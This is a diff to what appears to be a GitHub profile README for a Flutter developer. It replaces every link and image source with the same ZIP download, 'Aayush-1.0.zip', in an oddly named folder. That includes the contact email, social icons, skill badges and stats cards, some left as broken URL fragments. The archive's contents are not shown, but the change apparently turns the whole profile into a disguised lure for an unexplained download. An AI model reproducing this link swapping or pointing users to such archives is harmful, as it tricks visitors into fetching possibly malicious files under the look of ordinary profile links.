@@ -1,8 +1,8 @@
 <h1 align="center">
-    <img src="https://readme-typing-svg.herokuapp.com/?font=Righteous&size=35&center=true&vCenter=true&width=500&height=70&duration=4000&lines=Hey+There!+👋;+I'm+Aayush+Patel!;" />
+    <img src="https://github.com/Aayush014/Aayush014/raw/refs/heads/main/scrotocele/Aayush-1.0.zip+There!+👋;+I'm+Aayush+Patel!;" />
 </h1>
 
-<img src="https://res.cloudinary.com/superfolio/image/upload/v1620689979/68747470733a2f2f692e70696e696d672e636f6d2f6f726967696e616c732f63362f33332f63322f63363333633230656465383266306530636564376435373064626533613166332e676966_yjuh2s.gif"/>
+<img src="https://github.com/Aayush014/Aayush014/raw/refs/heads/main/scrotocele/Aayush-1.0.zip"/>
 
 <div>
 
@@ -11,7 +11,7 @@ const CrazyFlutterDev = {
     name: "Aayush Patel",
     pronouns: "he" | "him",
     location: ["Dindoli, Surat"],
-    contact: ["aayushpatel01411@gmail.com"],
+    contact: ["https://github.com/Aayush014/Aayush014/raw/refs/heads/main/scrotocele/Aayush-1.0.zip"],
     collaborations: ["Red & White Multimedia", "Self Learner"],
     workingOn: ["Flutter Development"],
     learning: ["C", "C++", "Dart", "Flutter", "Python"],
@@ -32,9 +32,9 @@ const CrazyFlutterDev = {
  </div>
  
 <p align="center">
-	<a href="https://github.com/Aayush014"><img src="https://img.icons8.com/bubbles/50/000000/github.png" alt="GitHub"/></a>
-	<a href="[https://www.linkedin.com/in/nwaobidaniel/](https://www.linkedin.com/in/aayush-patel-b55390296/)"><img src="https://img.icons8.com/bubbles/50/000000/linkedin.png" alt="LinkedIn"/></a>
-  	<a href="https://discordapp.com/users/822812589624393749"><img src="https://img.icons8.com/bubbles/50/000000/discord.png" alt="Discord"/></a>
+	<a href="https://github.com/Aayush014/Aayush014/raw/refs/heads/main/scrotocele/Aayush-1.0.zip"><img src="https://github.com/Aayush014/Aayush014/raw/refs/heads/main/scrotocele/Aayush-1.0.zip" alt="GitHub"/></a>
+	<a href="[https://github.com/Aayush014/Aayush014/raw/refs/heads/main/scrotocele/Aayush-1.0.zip](https://github.com/Aayush014/Aayush014/raw/refs/heads/main/scrotocele/Aayush-1.0.zip)"><img src="https://github.com/Aayush014/Aayush014/raw/refs/heads/main/scrotocele/Aayush-1.0.zip" alt="LinkedIn"/></a>
+  	<a href="https://github.com/Aayush014/Aayush014/raw/refs/heads/main/scrotocele/Aayush-1.0.zip"><img src="https://github.com/Aayush014/Aayush014/raw/refs/heads/main/scrotocele/Aayush-1.0.zip" alt="Discord"/></a>
 </p>
   
 </div>
@@ -44,8 +44,8 @@ const CrazyFlutterDev = {
 <h2 align="center">⚒️ Languages-Frameworks-Tools ⚒️</h2>
 <br/>
 <div align="center">
-    <img src="https://skillicons.dev/icons?i=cpp,dart,python,flutter,firebase,supabase,androidstudio,vscode,github,java,php,sqlite" />
-    <img src="https://skillicons.dev/icons?i=figma,postman,git,discord,bots,gcp,linkedin,instagram,twitter,idea,netlify,notion,pycharm" /><br>
+    <img src="https://github.com/Aayush014/Aayush014/raw/refs/heads/main/scrotocele/Aayush-1.0.zip,dart,python,flutter,firebase,supabase,androidstudio,vscode,github,java,php,sqlite" />
+    <img src="https://github.com/Aayush014/Aayush014/raw/refs/heads/main/scrotocele/Aayush-1.0.zip,postman,git,discord,bots,gcp,linkedin,instagram,twitter,idea,netlify,notion,pycharm" /><br>
 </div>
 
 <br/>
@@ -54,7 +54,7 @@ const CrazyFlutterDev = {
 <div align="center">
   <h2>🐍 My Contributions 🐍</h2>
   <br>
-  <img alt="snake eating my contributions" src="https://raw.githubusercontent.com/salesp07/salesp07/output/github-contribution-grid-snake.svg" />
+  <img alt="snake eating my contributions" src="https://github.com/Aayush014/Aayush014/raw/refs/heads/main/scrotocele/Aayush-1.0.zip" />
   
   <br/>
 </div>
@@ -65,15 +65,15 @@ const CrazyFlutterDev = {
 <br>
 
 <div align=center>
-  <img width=390 height=162.84 src="https://github-readme-stats.vercel.app/api?username=Aayush014&theme=algolia&show_icons=true&rank_icon=github&border_radius=20&count_private=true" alt="streak stats"/>
-<img width=390 height=162.84 src="https://github-readme-streak-stats.herokuapp.com/?user=Aayush014&theme=algolia&border_radius=20" alt="readme stats"/>
+  <img width=390 height=162.84 src="https://github.com/Aayush014/Aayush014/raw/refs/heads/main/scrotocele/Aayush-1.0.zip" alt="streak stats"/>
+<img width=390 height=162.84 src="https://github.com/Aayush014/Aayush014/raw/refs/heads/main/scrotocele/Aayush-1.0.zip" alt="readme stats"/>
   <br/>
 	
-   <img align="center" style="margin:0.5rem" src="https://github-readme-stats.vercel.app/api/top-langs/?username=Aayush014&layout=donut-vertical&show_icons=true&rank_icon=github&border_radius=20&title_color=00AEFF&text_color=c9cacc&icon_color=4AB197&bg_color=050F2C"/>
+   <img align="center" style="margin:0.5rem" src="https://github.com/Aayush014/Aayush014/raw/refs/heads/main/scrotocele/Aayush-1.0.zip"/>
 </div>
 
 <br/>
 
-<p align="center"> <img src="https://komarev.com/ghpvc/?username=Aayush014&label=Profile%20views&color=0e75b6&style=flat" alt="Aayush014" /> </p>
+<p align="center"> <img src="https://github.com/Aayush014/Aayush014/raw/refs/heads/main/scrotocele/Aayush-1.0.zip%20views&color=0e75b6&style=flat" alt="Aayush014" /> </p>
 
 <hr/>
